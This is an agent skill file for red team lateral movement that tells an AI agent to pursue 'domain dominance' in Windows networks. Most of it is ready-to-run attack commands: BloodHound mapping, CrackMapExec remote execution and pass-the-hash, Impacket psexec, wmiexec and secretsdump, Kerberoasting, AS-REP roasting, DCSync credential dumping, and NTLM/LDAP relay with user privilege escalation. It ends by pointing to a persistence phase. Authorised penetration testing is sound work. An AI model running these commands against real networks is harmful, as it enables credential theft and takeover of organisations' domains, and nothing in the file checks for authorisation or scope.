---
name: red-lateral
description: "Red team lateral movement skill. Active Directory attacks, SMB/WinRM pivoting, and credential relay. Use for red team lateral movement and domain dominance. Triggers: 'red lateral', 'lateral movement', 'ad attack', 'kerberos', 'smb', 'pivot'."
version: 1.0.0
phase: ["exploitation"]
category: ["exploitation"]
tools: ["bloodhound", "crackmapexec", "impacket", "metasploit", "responder"]
tags: ["red-team", "lateral-movement", "ad", "kerberos", "smb", "pivot"]
---

# Red Team Lateral Movement

You are performing **lateral movement** for a red team engagement. Your goal is to move through the network and achieve domain dominance.

## Tool Usage

```bash
# AD attack path mapping
bloodhound -c All -d domain.local -u user -p password -ns <dc-ip>

# SMB lateral movement
cme smb <target-range> -u user -p password --shares
cme smb <target> -u user -p password -x "whoami"

# WinRM lateral movement
cme winrm <target> -u user -p password -x "whoami"

# Impacket tools
python3 /opt/impacket/examples/psexec.py domain/user:password@target
python3 /opt/impacket/examples/secretsdump.py domain/user:password@target
python3 /opt/impacket/examples/wmiexec.py domain/user:password@target

# Kerberoasting
python3 /opt/impacket/examples/GetUserSPNs.py -request domain/user:password
```

## Lateral Movement Strategies

### SMB/WinRM Pivoting
```bash
# Enumerate SMB shares
cme smb <target-range> -u user -p password --shares --sessions

# Execute command via SMB
cme smb <target> -u user -p password -x "ipconfig /all"

# Pass the hash
cme smb <target> -u user -H <ntlm-hash> -x "whoami"

# WinRM execution
cme winrm <target> -u user -p password -x "systeminfo"
```

### Active Directory Attacks
```bash
# Kerberoasting
python3 /opt/impacket/examples/GetUserSPNs.py -request domain/user:password@dc

# AS-REP Roasting
python3 /opt/impacket/examples/GetNPUsers.py domain/ -usersfile users.txt -format hashcat

# DCSync
python3 /opt/impacket/examples/secretsdump.py domain/user:password@dc -just-dc

# Pass the ticket
python3 /opt/impacket/examples/ticket_converter.py ticket.kirbi ticket.ccache
```

### Credential Relay
```bash
# NTLM relay
ntlmrelayx.py -t smb://<target> -smb2support

# LDAP relay
ntlmrelayx.py -t ldap://<dc-ip> -smb2support --escalate-user <user>
```

## Output

Save to `.omop/red-team/<engagement>/lateral/`:
- `ad-paths.json` — BloodHound attack paths
- `smb-results.txt` — SMB enumeration results
- `credentials.txt` — Captured credentials (redacted)
- `lateral-log.txt` — Lateral movement log

## Next Phase

After lateral movement, proceed to **red-persistence** for persistence mechanisms.
